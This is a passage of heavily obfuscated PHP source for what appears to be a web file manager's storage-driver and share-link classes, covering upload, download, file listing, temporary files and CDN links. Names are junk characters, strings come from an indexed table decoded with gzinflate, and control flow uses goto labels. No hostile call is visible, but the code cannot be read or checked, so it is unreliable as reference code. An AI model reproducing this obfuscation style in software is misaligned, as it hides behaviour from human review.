setContent($…ã¼¹¦¹, $ı—µÉŞ• = '') { return $this->model->setContent($…ã¼¹¦¹, $ı—µÉŞ•); } public function fileSubstr($…èÃ‘šŞ, $¬€ãàÇµ, $ÑØèó—) { return $this->model->fileSubstr($…èÃ‘šŞ, $¬€ãàÇµ, $ÑØèó—); } public function download($ßŒ¹ñÛ, $½Œä  = '') { $ôƒÚœÜ³ = get_path_father($½Œä ); $Œ±øúÁ™ = get_path_this($½Œä ); $âªÙ‰—Õ = $this->model->fileInfoGet($ßŒ¹ñÛ); $ºíã±‘ = IO::copy($âªÙ‰—Õ[$_SERVER[°‰†òö¯][87]], $ôƒÚœÜ³, !1, $Œ±øúÁ™); return $ºíã±‘; } public function setModifyTime($ĞìÂƒœ, $üÄÀ¨â = '') { $àçúÊ´¬ =& $_SERVER[°‰†òö¯]; if (!$ĞìÂƒœ) { return; } $this->model->where(array($àçúÊ´¬[493] => $ĞìÂƒœ))->save(array($àçúÊ´¬[88] => $üÄÀ¨â)); } public function upload($§Ã¤–ã¡, $òˆÇğ©Á, $—ŒŞşï‹ = false, $‰ø”­–† = REPEAT_REPLACE) { $£‘ŸĞ¦ =& $_SERVER[°‰†òö¯]; $ÔŸÒÆğ¼ = $this->parse($§Ã¤–ã¡); $‘¨ìïãŠ = $this->model->addFile($ÔŸÒÆğ¼[$£‘ŸĞ¦[477]], $òˆÇğ©Á, $ÔŸÒÆğ¼[$£‘ŸĞ¦[87]], $—ŒŞşï‹, $‰ø”­–†); return $this->getPathOuter($‘¨ìïãŠ); } public function uploadFileByID($Ä›ıùä, $áÇõÛ‘¼, $ıó©º©Ë) { $·™Ø”£ =& $_SERVER[°‰†òö¯]; $ÇÛ¿÷– = $this->parse($Ä›ıùä); $ûÓÌ•ˆŒ = $this->model->addFileByFileID($ÇÛ¿÷–[$·™Ø”£[477]], $áÇõÛ‘¼, $ÇÛ¿÷–[$·™Ø”£[87]], $ıó©º©Ë); return $this->getPathOuter($ûÓÌ•ˆŒ); } public function addFileByRemote($ÚĞŞ¯×, $‚Šé’äš, $§ÕœüÅÁ = array(), $ˆòâİÁ» = '', $×¹Ñ¡ö») { $Ç×äÓÚ =& $_SERVER[°‰†òö¯]; $âèì• = $this->parse($ÚĞŞ¯×); $ˆòâİÁ» = empty($ˆòâİÁ») ? $âèì•[$Ç×äÓÚ[87]] : $ˆòâİÁ»; $¸í±´àÉ = $this->model->addFileByRemote($âèì•[$Ç×äÓÚ[477]], $‚Šé’äš, $ˆòâİÁ», $§ÕœüÅÁ, $×¹Ñ¡ö»); return $this->getPathOuter($¸í±´àÉ); } public function uploadLink($†»ºÛá³, $÷‚Ã¤Š¤ = 0) { $¿ñä Ò =& $_SERVER[°‰†òö¯]; $ÚÂÈÌé = $this->parse($†»ºÛá³); $Úíˆú× = _get($GLOBALS[$¿ñä Ò[7]], $¿ñä Ò[1421]); $ô»Û¨ = _get($GLOBALS[$¿ñä Ò[7]], $¿ñä Ò[1422]); $†»ºÛá³ = Model($¿ñä Ò[681])->createFileName($ÚÂÈÌé[$¿ñä Ò[87]], $Úíˆú×, $ô»Û¨); return IO::uploadLink($†»ºÛá³, $÷‚Ã¤Š¤); } public function fileNameAuto($»¨ø·ŒÈ, $ŒŞ¿Ÿ“, $Ÿ’‡ªÚ¼ = REPEAT_REPLACE, $È«Ç§¤ = false) { return $this->model->fileNameAuto($»¨ø·ŒÈ, $ŒŞ¿Ÿ“, $Ÿ’‡ªÚ¼, $È«Ç§¤); } public function fileNameExist($Ë°—± ğ, $é‡ÇÜÛ¾) { return $this->model->fileNameExist($Ë°—± ğ, $é‡ÇÜÛ¾); } protected function _fileOut($· üÚí², $Â‚şòæç = false, $ºŠã‰¹ = false, $ëàï°—É = '', $­®şîÛç = false) { $‚åÔ˜ =& $_SERVER[°‰†òö¯]; $áş÷Â‹† = $this->model->sourceInfo($· üÚí²); if ($áş÷Â‹†[$‚åÔ˜[487]] == $‚åÔ˜[91]) { header($‚åÔ˜[1423]); die; } $åªÍ­äà = $this->model->fileInfoGet($· üÚí²); $ëàï°—É = $åªÍ­äà[$‚åÔ˜[551]] ? $åªÍ­äà[$‚åÔ˜[551]] : $ëàï°—É; $×Õå‡’İ = isset($GLOBALS[$‚åÔ˜[182]]) && is_array($GLOBALS[$‚åÔ˜[182]]) ? $GLOBALS[$‚åÔ˜[182]][$‚åÔ˜[32]] : $áş÷Â‹†[$‚åÔ˜[32]]; if ($­®şîÛç) { return IO::fileOutServer($åªÍ­äà[$‚åÔ˜[87]], $Â‚şòæç, $×Õå‡’İ, $ëàï°—É); } IO::fileOut($åªÍ­äà[$‚åÔ˜[87]], $Â‚şòæç, $×Õå‡’İ, $ëàï°—É); } public function fileOut($—…‘Ëö•, $ÆÍÎ¬±Õ = false, $±¯é¤˜ = false, $ò› ’ à = '') { $this->_fileOut($—…‘Ëö•, $ÆÍÎ¬±Õ, $±¯é¤˜, $ò› ’ à); } public function fileOutServer($§ÆéªâÔ, $Åó°é = false, $âòÁø¼ = false, $¥ĞòÄˆÕ = '') { $this->_fileOut($§ÆéªâÔ, $Åó°é, $âòÁø¼, $¥ĞòÄˆÕ, !0); } protected function _fileOutImage($ç¯§¦šç, $ôá§± = 250) { $¸éáğ”¼ =& $_SERVER[°‰†òö¯]; $àÀĞ·á‹ = $this->model->pathInfo($ç¯§¦šç); if ($àÀĞ·á‹[$¸éáğ”¼[487]] == $¸éáğ”¼[91]) { show_json($¸éáğ”¼[1424] . $ç¯§¦šç, !1); } $¯êÜÉ¯ä = $this->model->fileInfoGet($ç¯§¦šç); $àÀĞ·á‹[$¸éáğ”¼[183]] = $¯êÜÉ¯ä[$¸éáğ”¼[87]]; $GLOBALS[$¸éáğ”¼[182]] = $àÀĞ·á‹; IO::fileOutImage($¯êÜÉ¯ä[$¸éáğ”¼[87]], $ôá§±); } public function fileOutImage($äıôĞ«, $Í¢ÈÛÙŠ = 250) { $this->_fileOutImage($äıôĞ«, $Í¢ÈÛÙŠ); } public function fileOutImageServer($åŞÅ°óÔ, $…Ğ©šøŞ = 250) { $this->_fileOutImage($åŞÅ°óÔ, $…Ğ©šøŞ); } public function link($ÂÚöƒ˜Ñ, $”ÚÉì£¿ = '') { $ıÑˆ…¬æ = $this->model->fileInfoGet($ÂÚöƒ˜Ñ); return IO::link($ıÑˆ…¬æ[$_SERVER[°‰†òö¯][87]], $”ÚÉì£¿); } protected function parse($êü‡… ) { $¹ƒËØË =& $_SERVER[°‰†òö¯]; if (strstr($êü‡… , $¹ƒËØË[8]) === !1) { return array($¹ƒËØË[495] => intval($êü‡… ), $¹ƒËØË[87] => $¹ƒËØË[12], $¹ƒËØË[1420] => array()); } $±ö› †™ = explode($¹ƒËØË[8], trim($êü‡… , $¹ƒËØË[8])); if (count($±ö› †™) < 2) { show_tips(clear_html($êü‡… ) . $¹ƒËØË[1425]); } return array($¹ƒËØË[495] => intval($±ö› †™[0]), $¹ƒËØË[87] => $±ö› †™[1], $¹ƒËØË[1420] => array_slice($±ö› †™, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÄñÑ²‹) { $this->pathParse = $ÄñÑ²‹; $this->model = Model($_SERVER[°‰†òö¯][1419]); } public function getPathOuter($û¬ÂºÎ) { $ÅÔÂÃÌ =& $_SERVER[°‰†òö¯]; if (!$û¬ÂºÎ) { return $û¬ÂºÎ; } $®üíõÚ€ = $this->parse($û¬ÂºÎ); return trim(KodIO::makeShare($this->pathParse[$ÅÔÂÃÌ[477]], $®üíõÚ€[$ÅÔÂÃÌ[477]]), $ÅÔÂÃÌ[8]); } protected function infoParse($™˜äÍ·à, $ş¡‘Å¨ç = false, $…íà¹ö = false) { $™·óÃƒÎ =& $_SERVER[°‰†òö¯]; $İ§éÍÙ = $this->pathParse[$™·óÃƒÎ[477]]; $¡ëüö™ = trim($this->pathParse[$™·óÃƒÎ[1248]], $™·óÃƒÎ[8]); return Action($™·óÃƒÎ[1426])->sharePathInfo($İ§éÍÙ, $¡ëüö™, $ş¡‘Å¨ç); } public function infoFull($•¯¬„É) { $§ñ™ÒšÉ =& $_SERVER[°‰†òö¯]; $ì³ñËšÕ = explode($§ñ™ÒšÉ[8], trim($•¯¬„É, $§ñ™ÒšÉ[8])); if (count($ì³ñËšÕ) > 1) { $îèúÄÔ = implode($§ñ™ÒšÉ[8], array_splice($ì³ñËšÕ, 1)); $Ğˆíõ¢è = $this->model->pathInfoByPath($ì³ñËšÕ[0], $îèúÄÔ); if (!$Ğˆíõ¢è) { return !1; } $this->pathParse[$§ñ™ÒšÉ[1248]] = $Ğˆíõ¢è[$§ñ™ÒšÉ[193]]; } return $this->infoParse($•¯¬„É); } public function listAll($±æ’™æ) { $½É”£¶– =& $_SERVER[°‰†òö¯]; $é‡Ø®Ø = IO::info($this->pathParse[$½É”£¶–[87]]); if (!$é‡Ø®Ø) { return array(); } $°‚Ã·• = $this->model->listAll($±æ’™æ); $¾‰ï†Ó§ = Model($½É”£¶–[671])->getInfo($é‡Ø®Ø[$½É”£¶–[672]]); foreach ($°‚Ã·• as &$¤ŸÚ–¡µ) { check_abort(); $¤ŸÚ–¡µ[$½É”£¶–[90]] = Action($½É”£¶–[1426])->_shareItemeParse($¤ŸÚ–¡µ[$½É”£¶–[90]], $¾‰ï†Ó§); } unset($¤ŸÚ–¡µ); return $°‚Ã·•; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($×òÀ¥ïÌ) { $this->pathParse = $×òÀ¥ïÌ; $this->model = Model($_SERVER[°‰†òö¯][1419]); } protected function infoParse($éŞøõı, $îÌâúğ½ = false, $™¦Åø = false) { $û³ˆÁŸø =& $_SERVER[°‰†òö¯]; return Action($û³ˆÁŸø[1254])->sharePathInfo($this->pathParse[$û³ˆÁŸø[87]], !0, $îÌâúğ½); } public function listPath($ŠšİÔÆæ, $Õ¢Ë¢¶Ü = false) { $°Ñ›„¥Ö =& $_SERVER[°‰†òö¯]; $¯›Çæ—— = parent::listPath($ŠšİÔÆæ, $Õ¢Ë¢¶Ü); if (!$¯›Çæ——) { return $¯›Çæ——; } if (is_array($¯›Çæ——[$°Ñ›„¥Ö[1427]])) { $¯›Çæ——[$°Ñ›„¥Ö[1427]] = Action($°Ñ›„¥Ö[1254])->shareItemInfo($¯›Çæ——[$°Ñ›„¥Ö[1427]]); } foreach ($¯›Çæ—— as $ìÜìšå¿ => $©¨Ÿ¸ÂÉ) { if (!in_array($ìÜìšå¿, array($°Ñ›„¥Ö[86], $°Ñ›„¥Ö[85]))) { continue; } foreach ($©¨Ÿ¸ÂÉ as $™ù¼şöò => $²ÃÄ¹á€) { $¯›Çæ——[$ìÜìšå¿][$™ù¼şöò] = Action($°Ñ›„¥Ö[1254])->shareItemInfo($²ÃÄ¹á€); } } return $¯›Çæ——; } public function listAll($™Š·±Åğ) { $¥Å¢¡›· =& $_SERVER[°‰†òö¯]; $Óåçş…æ = IO::info($this->pathParse[$¥Å¢¡›·[87]]); if (!$Óåçş…æ) { return array(); } $÷³ÖÄë‚ = $this->model->listAll($™Š·±Åğ); foreach ($÷³ÖÄë‚ as &$ì“’Øªù) { $ì“’Øªù[$¥Å¢¡›·[90]] = Action($¥Å¢¡›·[1254])->shareItemInfo($ì“’Øªù[$¥Å¢¡›·[90]]); } unset($ì“’Øªù); return $÷³ÖÄë‚; } } goto dèºÀ’í±ï; fŒ÷©Ü¤†: if (!$voegysalfb) { return; } $_SERVER[¯“©ŠÌ] = explode($_SERVER[°‰†òö¯][687], gzinflate(substr($_SERVER[°‰†òö¯][688], 10, -8))); $hmyoflstiw = $_SERVER[°‰†òö¯][689]; goto aœÇ¿Ê¾â; F÷ ¥‘îàÀ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¸Ùã“ ¸ =& $_SERVER[°‰†òö¯]; $this->objectDriver = array($¸Ùã“ ¸[60], $¸Ùã“ ¸[61], $¸Ùã“ ¸[62], $¸Ùã“ ¸[63], $¸Ùã“ ¸[64], $¸Ùã“ ¸[65], $¸Ùã“ ¸[66], $¸Ùã“ ¸[67], $¸Ùã“ ¸[68], $¸Ùã“ ¸[69], $¸Ùã“ ¸[70], $¸Ùã“ ¸[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($š¸ı‹¬‹) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($š¸ı‹¬‹, $_SERVER[°‰†òö¯][8]); } return $š¸ı‹¬‹; } public function iconvApp($¨¦‹ü¨è) { return $¨¦‹ü¨è; } public function iconvSystem($èŠÇÃç¼) { return $èŠÇÃç¼; } public function iconvTo($¶¯€ƒùÀ, $¢ÇœİÁ, $–ö»®Æ·) { $Í«²ğÖ =& $_SERVER[°‰†òö¯]; if (!$¶¯€ƒùÀ || !function_exists($Í«²ğÖ[72])) { return $¶¯€ƒùÀ; } static $Ò€Ú¥® = array(); $œìÌîó¶ = $¢ÇœİÁ . $Í«²ğÖ[73] . $–ö»®Æ· . $Í«²ğÖ[74] . $¶¯€ƒùÀ; if (isset($Ò€Ú¥®[$œìÌîó¶])) { return $Ò€Ú¥®[$œìÌîó¶]; } if (function_exists($Í«²ğÖ[75])) { $Ï‡ÇÎÚß = @mb_convert_encoding($¶¯€ƒùÀ, $–ö»®Æ·, $¢ÇœİÁ); } else { $Ï‡ÇÎÚß = @iconv($¢ÇœİÁ, $–ö»®Æ·, $¶¯€ƒùÀ); } $Ï‡ÇÎÚß = $Ï‡ÇÎÚß ? $Ï‡ÇÎÚß : $¶¯€ƒùÀ; if (strstr($Ï‡ÇÎÚß, $Í«²ğÖ[76])) { $Ï‡ÇÎÚß = str_replace($Í«²ğÖ[76], $Í«²ğÖ[11], $Ï‡ÇÎÚß); } $Ò€Ú¥®[$¢ÇœİÁ . $Í«²ğÖ[73] . $–ö»®Æ· . $Í«²ğÖ[74] . $¶¯€ƒùÀ] = $Ï‡ÇÎÚß; $Ò€Ú¥®[$–ö»®Æ· . $Í«²ğÖ[73] . $¢ÇœİÁ . $Í«²ğÖ[74] . $¶¯€ƒùÀ] = $¶¯€ƒùÀ; $Ò€Ú¥®[$–ö»®Æ· . $Í«²ğÖ[73] . $¢ÇœİÁ . $Í«²ğÖ[74] . $Ï‡ÇÎÚß] = $¶¯€ƒùÀ; $Ò€Ú¥®[$¢ÇœİÁ . $Í«²ğÖ[73] . $–ö»®Æ· . $Í«²ğÖ[74] . $Ï‡ÇÎÚß] = $Ï‡ÇÎÚß; return $Ï‡ÇÎÚß; } public function getPathInner($•ğÉïÆ¸) { $â¿İ“íè = IO::init($•ğÉïÆ¸); return $â¿İ“íè->path; } public function getPathOuter($¯şÁ¸) { $ÃœÚË‘– =& $_SERVER[°‰†òö¯]; $‹š¬Éš£ = strlen(trim($this->pathBase, $ÃœÚË‘–[8])); $¯şÁ¸ = substr(trim($¯şÁ¸, $ÃœÚË‘–[8]), $‹š¬Éš£); return $this->pathDriver . $ÃœÚË‘–[8] . ltrim($¯şÁ¸, $ÃœÚË‘–[8]); } public function isParentOf($çÉ‚ÚÇ™, $ÑüÃÄ‰Ö) { $ŞÛıö¹î =& $_SERVER[°‰†òö¯]; $çÉ‚ÚÇ™ = rtrim(strtolower($çÉ‚ÚÇ™), $ŞÛıö¹î[8]) . $ŞÛıö¹î[8]; $ÑüÃÄ‰Ö = rtrim(strtolower($ÑüÃÄ‰Ö), $ŞÛıö¹î[8]) . $ŞÛıö¹î[8]; $½¬†’¤É = strpos($ÑüÃÄ‰Ö, $çÉ‚ÚÇ™) === 0; return $½¬†’¤É; } public function getType() { $ÍÕî˜ä¸ =& $_SERVER[°‰†òö¯]; $şñïŠÇ“ = str_replace($ÍÕî˜ä¸[77], $ÍÕî˜ä¸[12], get_class($this)); return strtolower($şñïŠÇ“); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($âÁö²Å§, $ÛÒ·úÂ­) { $‘¨Ø¡ëĞ =& $_SERVER[°‰†òö¯]; $ì—¯£† = rtrim($âÁö²Å§, $‘¨Ø¡ëĞ[8]) . $‘¨Ø¡ëĞ[8] . $ÛÒ·úÂ­; $ÁÓ…Ë = $this->exist($ì—¯£†); return $ÁÓ…Ë ? $ì—¯£† : !1; } public function setModifyTime($àÏå¶Ñı, $¦¡Ó·«ˆ = '') { } public function renameObject($Ë¾šı—´, $§¾ÎÚö) { $Ì¤’ı®ü = $§¾ÎÚö; $Ë¾šı—´ = $this->getPathOuter($Ë¾šı—´); $§¾ÎÚö = $this->pathFather($Ë¾šı—´) . $§¾ÎÚö; $£ÌÁÌµª = IO::copy($Ë¾šı—´, $this->pathFather($Ë¾šı—´), REPEAT_RENAME_FOLDER, $Ì¤’ı®ü); if ($£ÌÁÌµª) { IO::remove($Ë¾šı—´); } return $£ÌÁÌµª ? $§¾ÎÚö : !1; } public function tempFile($ª¼ÅñºŠ = '', $ç²ÖûÕ = '') { if (!$ª¼ÅñºŠ) { $ª¼ÅñºŠ = rand_string(15); } $¶úğèéá = TEMP_FILES . rand_string(15) . $_SERVER[°‰†òö¯][8]; @mkdir($¶úğèéá, DEFAULT_PERRMISSIONS, !0); $¸øÖÑ¾ˆ = $¶úğèéá . $ª¼ÅñºŠ; @touch($¸øÖÑ¾ˆ); if ($ç²ÖûÕ) { file_put_contents($¸øÖÑ¾ˆ, $ç²ÖûÕ); } return $¸øÖÑ¾ˆ; } public function tempFileRemve($âú—¤) { @unlink($âú—¤); @rmdir($this->pathFather($âú—¤)); } public function mkfile($Š†´ƒÄª, $û”½Ôƒ¶ = '', $‡µ¦°½« = REPEAT_RENAME) { } public function mkdir($ëØèĞŒ‚, $À¡¹•Ğî = REPEAT_SKIP) { } public function delFile($üÒ€…ì) { } public function delFolder($Ú ŞÙÜ) { } public function copyFile($è‰Ñ»á, $’–ùú’) { } public function moveFile($´ê²ŠĞ, $ş•ˆ¯á) { } public function remove($³´¨Ê²Ì) { if ($this->isFile($³´¨Ê²Ì)) { return $this->delFile($³´¨Ê²Ì); } return $this->delFolder($³´¨Ê²Ì); } public function rename($öºõı‰ê, $„úÁ°Õñ) { } public function exist($šˆì…±) { } public function findByHash($…¾²øı” = '', $ù­ºØ“ë = '') { return !1; } public function isFile($È‰ùŸ­) { } public function isFolder($ò¸¾Ûè) { } public function size($©¢…ş…Í) { } public function info($ØÜë–ï´) { } public function infoSimple($áŒÃÈá×) { return $this->info($áŒÃÈá×); } public function infoAuth($…ÁÎæÒå) { return $this->info($…ÁÎæÒå); } public function infoFull($İÜ‡ÂÔÅ) { return $this->info($İÜ‡ÂÔÅ); } public function infoFullSimple($—¶Ó²¾å) { return $this->info($—¶Ó²¾å); } public function infoWithChildren($Ñ¸¼ê­¥) { $ì¡»ü˜ö =& $_SERVER[°‰†òö¯]; static $¬–ºÒƒë = array(); if (isset($¬–ºÒƒë[$Ñ¸¼ê­¥])) { return $¬–ºÒƒë[$Ñ¸¼ê­¥]; } $Ï§£²Ã = $this->info($Ñ¸¼ê­¥); if ($Ï§£²Ã && $Ï§£²Ã[$ì¡»ü˜ö[33]] == $ì¡»ü˜ö[78]) { $áÈÒÀªã = array($ì¡»ü˜ö[79] => 0, $ì¡»ü˜ö[80] => 0, $ì¡»ü˜ö[81] => 0); $this->infoChildren($Ñ¸¼ê­¥, $áÈÒÀªã); $Ï§£²Ã[$ì¡»ü˜ö[79]] = $áÈÒÀªã[$ì¡»ü˜ö[79]]; $Ï§£²Ã[$ì¡»ü˜ö[82]] = array($ì¡»ü˜ö[83] => $áÈÒÀªã[$ì¡»ü˜ö[80]], $ì¡»ü˜ö[84] => $áÈÒÀªã[$ì¡»ü˜ö[81]]); $¬–ºÒƒë[$Ñ¸¼ê­¥] = $Ï§£²Ã; } return $Ï§£²Ã; } public function listPath($é³•ŠÒ, $Ü£‡—ì = false) { } public function has($Ë¤É…–¾, $ñÃÀíœö = false, $ÑÌ¡“ºô = false) { } public function canRead($Ê†ÖÃú) { } public function canWrite($™¬¡³™ì) { } public function getContent($èÏÌ€) { } public function setContent($´ÖÛ•±, $˜…œäêÜ = '') { } protected function infoChildren($á³Ë”ó, &$Åü¨Ûîš) { $¸†Š“©Ÿ =& $_SERVER[°‰†òö¯]; check_abort_echo(); $”‚ˆßÎ¿ = $this->listPath($á³Ë”ó, !0); $”‚ˆßÎ¿ = array_merge($”‚ˆßÎ¿[$¸†Š“©Ÿ[85]], $”‚ˆßÎ¿[$¸†Š“©Ÿ[86]]); foreach ($”‚ˆßÎ¿ as $ÊáûÎú¡) { if ($ÊáûÎú¡[$¸†Š“©Ÿ[33]] == $¸†Š“©Ÿ[78]) { $Åü¨Ûîš[$¸†Š“©Ÿ[81]]++; $Àø‰Ô°ö = $this->getPathInner($ÊáûÎú¡[$¸†Š“©Ÿ[87]]); $this->infoChildren($Àø‰Ô°ö, $Åü¨Ûîš); } else { $Åü¨Ûîš[$¸†Š“©Ÿ[80]]++; $Åü¨Ûîš[$¸†Š“©Ÿ[79]] += $ÊáûÎú¡[$¸†Š“©Ÿ[79]]; } } } public function fileSubstr($²—ıÑ‘ƒ, $Ûš‰ÕÄ, $ßÉ§¾) { } public function listAll($êíŒ–) { } public function listAllMake($Ó·¯İÚ, &$‘é‚Æó±) { $ã¢ÑÜË =& $_SERVER[°‰†òö¯]; check_abort_echo(); $·£µ¿Ş = $this->listPath($Ó·¯İÚ, !0); if (!$·£µ¿Ş) { return; } $á†²°‚í = array_merge($·£µ¿Ş[$ã¢ÑÜË[85]], $·£µ¿Ş[$ã¢ÑÜË[86]]); foreach ($á†²°‚í as $‚Ãâı‹”) { $•õ×şÜ¢ = $‚Ãâı‹”[$ã¢ÑÜË[33]] == $ã¢ÑÜË[78]; $Ù‚çŸ¼Ø = array($ã¢ÑÜË[87] => $‚Ãâı‹”[$ã¢ÑÜË[87]], $ã¢ÑÜË[78] => $•õ×şÜ¢); if (isset($‚Ãâı‹”[$ã¢ÑÜË[79]])) { $Ù‚çŸ¼Ø[$ã¢ÑÜË[79]] = $‚Ãâı‹”[$ã¢ÑÜË[79]]; } if (isset($‚Ãâı‹”[$ã¢ÑÜË[88]])) { $Ù‚çŸ¼Ø[$ã¢ÑÜË[88]] = $‚Ãâı‹”[$ã¢ÑÜË[88]]; } if (!$•õ×şÜ¢) { $‘é‚Æó±[] = $Ù‚çŸ¼Ø; continue; } $‘é‚Æó±[] = $Ù‚çŸ¼Ø; $Ò®ÒúÁ§ = $‚Ãâı‹”[$ã¢ÑÜË[87]]; $‚¡ÒÃ¶¨ = $this->pathDriver; if (substr($‚Ãâı‹”[$ã¢ÑÜË[87]], 0, strlen($‚¡ÒÃ¶¨)) == $‚¡ÒÃ¶¨) { $Ò®ÒúÁ§ = substr($Ò®ÒúÁ§, strlen($‚¡ÒÃ¶¨)); } $this->listAllMake($Ò®ÒúÁ§, $‘é‚Æó±); } } public function listAllSimple($ÛûŸ ş, $ÄÏ£›è = false) { $×óó€éé = $this->listAll($ÛûŸ ş); return $this->listAllSimpleMake($×óó€éé, $this->getPathOuter($ÛûŸ ş), $ÄÏ£›è); } public function listAllSimpleMake($Ûšï™¯¹, $Ğ†‚‘Şí, $´ÖëáıÊ) { $®Õİ€œ¶ =& $_SERVER[°‰†òö¯]; $Ğ“òêúœ = array(); $Ğ†‚‘Şí = rtrim(get_path_father($Ğ†‚‘Şí), $®Õİ€œ¶[8]) . $®Õİ€œ¶[8]; foreach ($Ûšï™¯¹ as $ëæÛ‹å) { $€Õ‹¯€ğ = array($®Õİ€œ¶[87] => $ëæÛ‹å[$®Õİ€œ¶[87]], $®Õİ€œ¶[89] => $ëæÛ‹å[$®Õİ€œ¶[87]], $®Õİ€œ¶[78] => $ëæÛ‹å[$®Õİ€œ¶[78]]); if (isset($ëæÛ‹å[$®Õİ€œ¶[79]]) && !$ëæÛ‹å[$®Õİ€œ¶[78]]) { $€Õ‹¯€ğ[$®Õİ€œ¶[79]] = $ëæÛ‹å[$®Õİ€œ¶[79]]; } if (isset($ëæÛ‹å[$®Õİ€œ¶[88]])) { $€Õ‹¯€ğ[$®Õİ€œ¶[88]] = $ëæÛ‹å[$®Õİ€œ¶[88]]; } if (is_array($ëæÛ‹å[$®Õİ€œ¶[90]])) { $€Õ‹¯€ğ[$®Õİ€œ¶[89]] = $ëæÛ‹å[$®Õİ€œ¶[90]][$®Õİ€œ¶[87]]; $€Õ‹¯€ğ[$®Õİ€œ¶[79]] = $ëæÛ‹å[$®Õİ€œ¶[90]][$®Õİ€œ¶[79]]; $€Õ‹¯€ğ[$®Õİ€œ¶[88]] = $ëæÛ‹å[$®Õİ€œ¶[90]][$®Õİ€œ¶[88]]; } else { if (substr($ëæÛ‹å[$®Õİ€œ¶[87]], 0, strlen($Ğ†‚‘Şí)) == $Ğ†‚‘Şí) { $€Õ‹¯€ğ[$®Õİ€œ¶[87]] = substr($ëæÛ‹å[$®Õİ€œ¶[87]], strlen($Ğ†‚‘Şí)); } } $äÕ©õ¡û = $ëæÛ‹å[$®Õİ€œ¶[78]] ? $®Õİ€œ¶[8] : $®Õİ€œ¶[12]; $€Õ‹¯€ğ[$®Õİ€œ¶[89]] = rtrim($€Õ‹¯€ğ[$®Õİ€œ¶[89]], $®Õİ€œ¶[8]) . $äÕ©õ¡û; $€Õ‹¯€ğ[$®Õİ€œ¶[87]] = $®Õİ€œ¶[8] . trim($€Õ‹¯€ğ[$®Õİ€œ¶[87]], $®Õİ€œ¶[8]) . $äÕ©õ¡û; if (!$´ÖëáıÊ) { $ò»á›å­ = explode($®Õİ€œ¶[8], trim($€Õ‹¯€ğ[$®Õİ€œ¶[87]], $®Õİ€œ¶[8])); $€Õ‹¯€ğ[$®Õİ€œ¶[87]] = $®Õİ€œ¶[8] . implode($®Õİ€œ¶[8], array_slice($ò»á›å­, 1)) . $äÕ©õ¡û; } $Ğ“òêúœ[] = $€Õ‹¯€ğ; } return array_sort_by($Ğ“òêúœ, $®Õİ€œ¶[87]); } public function upload($íêˆ€Ãû, $ŸÔõ”¸°, $×îáîƒ = false, $ßÀ×ŸÛ€ = REPEAT_REPLACE) { } public function uploadFileByID($“ÎÀ£ÎŠ, $«¸ºŠàØ, $ˆø¦éª¡) { } public function uploadFileByPath($ÎÇĞı®˜, $˜©À™µÎ, $ğêŸáçµ = array()) { } public function isUploadServer() { $Óûˆª×¯ =& $_SERVER[°‰†òö¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Óûˆª×¯[91]) { return !0; } return $GLOBALS[$Óûˆª×¯[6]][$Óûˆª×¯[92]][$Óûˆª×¯[93]]; } public function isFileOutServer() { $û¢ğÌë =& $_SERVER[°‰†òö¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $û¢ğÌë[91]) { return !0; } return $GLOBALS[$û¢ğÌë[6]][$û¢ğÌë[92]][$û¢ğÌë[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¥²ı÷ƒÄ) { $á½±Ì =& $_SERVER[°‰†òö¯]; if (!$this->isCdnHost()) { return $¥²ı÷ƒÄ; } return str_replace(trim(get_url_root($¥²ı÷ƒÄ), $á½±Ì[8]), trim($this->cdnHost, $á½±Ì[8]), $¥²ı÷ƒÄ); } public function uploadLink($Úß¦ÉøÀ, $’…Õ¿¡¬ = 0) { $¥Ğ¶“Ú =& $_SERVER[°‰†òö¯]; if ($this->isUploadServer()) { return; } $íõÆŸŞ¿ = $this->getType(); if (!in_array($íõÆŸŞ¿, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Šë”†ÇÀ = 1024 * 1024 * 10; $àèëô¬¢ = $’…Õ¿¡¬ <= $Šë”†ÇÀ ? $¥Ğ¶“Ú[95] : $¥Ğ¶“Ú[96]; $³¡±É‰† = (!$’…Õ¿¡¬ ? 1 : ceil($’…Õ¿¡¬ / pow(1024, 3))) * 3600 * 4; $ì¸çšÎÎ = $this->{$àèëô¬¢}($Úß¦ÉøÀ, $³¡±É‰†); if ($ì¸çšÎÎ) { $ì¸çšÎÎ[$¥Ğ¶“Ú[97]] = $Úß¦ÉøÀ; $ì¸çšÎÎ[$¥Ğ¶“Ú[98]] = $íõÆŸŞ¿; } return $ì¸çšÎÎ; } public function uploadFormData($õ­’çêŸ, $¼å—¹Ò = 3600) { } public function uploadMultiData($ÔîéˆÊˆ, $š®“­Š³ = 3600) { } public function multiUploadFormData($¨Ÿ³éÚõ, $Íİ¯˜¨È = 3600) { return $this->uploadMultiData($¨Ÿ³éÚõ, $Íİ¯˜¨È); } public function download($”îùÍ³ë, $áÆÏê“é) { } public function ext($ÒŠ¦ÀüÉ) { $‰öíí«— =& $_SERVER[°‰†òö¯]; if (strpos($ÒŠ¦ÀüÉ, $‰öíí«—[8]) === -1) { $«İ›æ§È = $ÒŠ¦ÀüÉ; } else { $«İ›æ§È = $this->pathThis($ÒŠ¦ÀüÉ); } $éÚÎşüİ = $‰öíí«—[12]; if (strstr($«İ›æ§È, $‰öíí«—[10])) { $éÚÎşüİ = substr($«İ›æ§È, strrpos($«İ›æ§È, $‰öíí«—[10]) + 1); $éÚÎşüİ = strtolower($éÚÎşüİ); } if (strlen($éÚÎşüİ) > 3 && preg_match($‰öíí«—[99], $éÚÎşüİ, $ÈŸß ­û)) { $éÚÎşüİ = $‰öíí«—[12]; } return $éÚÎşüİ; } public function pathThis($ÓºÜãÜÓ) { $—º—áÎ =& $_SERVER[°‰†òö¯]; $ÓºÜãÜÓ = str_replace($—º—áÎ[100], $—º—áÎ[8], rtrim($ÓºÜãÜÓ, $—º—áÎ[8])); $•›£ßÍ¥ = strrpos($ÓºÜãÜÓ, 